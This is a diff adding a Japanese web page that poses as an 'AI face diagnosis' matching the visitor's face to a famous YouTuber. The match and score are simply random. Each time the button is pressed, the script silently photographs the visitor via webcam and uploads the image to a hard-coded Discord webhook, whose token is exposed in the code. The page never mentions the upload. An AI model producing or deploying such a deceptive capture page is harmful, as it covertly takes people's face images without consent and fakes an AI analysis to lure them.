@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI顔診断</title>
+  <style>
+    body { text-align: center; font-family: sans-serif; padding: 20px; background: #f0f2f5; }
+    video, canvas { max-width: 100%; border-radius: 12px; margin-top: 10px; }
+    button { padding: 12px 24px; font-size: 18px; background: #5865F2; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 15px; }
+    button:disabled { background: #ccc; }
+    #result { margin-top: 15px; font-weight: bold; font-size: 18px; color: #333; }
+  </style>
+</head>
+<body>
+
+  <h1>✨ AI顔診断 ✨</h1>
+  <p>カメラの前に顔を合わせて「診断スタート」を押してね！</p>
+
+  <video id="video" autoplay playsinline width="400" height="300"></video><br>
+  <button id="snap">診断スタート！</button>
+  <div id="result"></div>
+
+  <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+
+  <script>
+    // Webhook URL
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1548840989182132314/mv3j_APZBlMk4U50K2xkRNynTZ_7guk-IBdFXubAfBj6h7abNvdxRw3FqOwCUMzhggEU";
+
+    const YOUTUBERS = [
+      "HIKAKIN", "はじめしゃちょー", "東海オンエア（てつや）",
+      "コムドット（やまと）", "キヨ。", "ひろゆき", "平成フラミンゴ", "ヴァンゆん"
+    ];
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snap = document.getElementById('snap');
+    const result = document.getElementById('result');
+
+    // カメラの起動
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => { alert("カメラの起動に失敗しました: " + err); });
+
+    snap.addEventListener('click', () => {
+      snap.disabled = true;
+      result.innerText = "診断中...";
+
+      // 画像の撮影
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, 400, 300);
+
+      // ランダム判定
+      const youtuber = YOUTUBERS[Math.floor(Math.random() * YOUTUBERS.length)];
+      const score = Math.floor(Math.random() * 30) + 70; // 70~99点
+
+      const message = `**【AI顔診断結果】**\n✨ 似ているYouTuber: **${youtuber}**\n💯 似ている度: **${score}点**`;
+
+      // Canvasから画像Blobを取得してDiscordに送信
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('content', message);
+        formData.append('file', blob, 'capture.jpg');
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        }).then(res => {
+          if(res.ok) {
+            result.innerText = `診断完了！結果：${youtuber}（${score}点）`;
+          } else {
+            result.innerText = "送信に失敗しました。";
+          }
+          snap.disabled = false;
+        }).catch(err => {
+          result.innerText = "エラーが発生しました。";
+          snap.disabled = false;
+        });
+      }, 'image/jpeg');
+    });
+  </script>
+</body>
+</html>
